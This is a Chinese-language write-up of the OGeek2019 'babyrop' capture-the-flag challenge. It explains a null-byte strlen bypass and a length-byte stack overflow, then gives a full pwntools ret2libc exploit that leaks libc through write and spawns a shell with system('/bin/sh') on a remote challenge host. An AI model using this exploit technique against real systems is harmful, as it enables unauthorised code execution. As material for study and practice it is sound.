

# [OGeek2019]babyrop

## 分析程序

### main函数分析

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-11_20-59-18.png)





### sub_804871f函数分析

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-11_21-02-08.png)



### sub_80487D0函数分析

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-11_21-04-01.png)



### 流程介绍

**由上图可知，整个流程就是，首先输入一个数据，判断是否与程序生成的随机数相等；若相等，则输出`correct\n`字符串，然后返回输入数据的第八个字节，否则程序结束。然后作为参数传递个下一个函数，若该数据为`\x7f`,则输入`0xC8`长度的数据，较为安全，若不等于该值，则输入该数值长度的数据！**



## 解题思路

该题主要有两个难点：

- 要使得第一次输入与随机数相等
- 根据题目`rop`提示我们需要找到溢出点

针对问题一：

由于随机数每次是随机生成的，同时题中不存在泄露随机数的条件以及改写随机数的格式化字符串；因此考虑到`strlen（）`函数对长度的判断是以`\x00`作为字符串的结尾，因此 我们自需要使`payload`的第一个字节的值为`\x00`即可使得字符串得到的长度为0，成果绕过`strncmp`函数的比较

针对问题二：

传参不为`\x7f`即可作为输入的长度值；因此若`a1`的值设为`0xff`即可存在 栈溢出漏洞，因此往前推 可知 `buf[7]`需要为`0xff`

从而得到 第一次输入的`payload =b"\x00" + 6*b"A" + b"\xff" ` 保证一头一尾的数据来满足栈溢出的条件；后面的`payload`只需按照一般的`ret2libc`实现即可

## EXP

```python
#! /usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os = 'linux',arch = 'i386',log_level='debug')
#context.terminal = ['tmux', 'splitw', '-h']
#io = process("/home/always/PWN/OGeek2019_babyrop")
io = remote("node4.buuoj.cn",29248)
e = ELF("/home/always/PWN/OGeek2019_babyrop")

offest = 235

read_got_addr = e.got["read"]

write_plt_addr = e.plt["write"]
#vul_func_addr = 0x080487D0
main_addr = 0x08048825
payload = b"\x00" + 6*b"A" + b"\xff"
#pause()

io.sendline(payload)
io.recvuntil(b"Correct\n")
payload1 = offest*b'A' + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(read_got_addr) + p32(4)
io.sendline(payload1)
read_libc_addr  = u32(io.recv(4))

log.success("read_libc_addr==========>{}".format(hex(read_libc_addr)))

#libc = LibcSearcher("read",read_libc_addr)
#libc_base = read_libc_addr - libc.dump("read")
#sys_addr  = libc_base + libc.dump("system")
#binsh_addr = libc_base + libc.dump("str_bin_sh")
libc = ELF("/home/always/PWN/libc-2.23.so")
libc_base = read_libc_addr - libc.symbols["read"]
sys_addr  = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
log.success("libc_base==========>{}".format(hex(libc_base)))
paylaod2 = offest*b'A' + p32(sys_addr) + p32(main_addr) + p32(binsh_addr)
io.sendline(payload)
io.recvuntil(b"Correct\n")
io.sendline(paylaod2)
io.interactive()
```

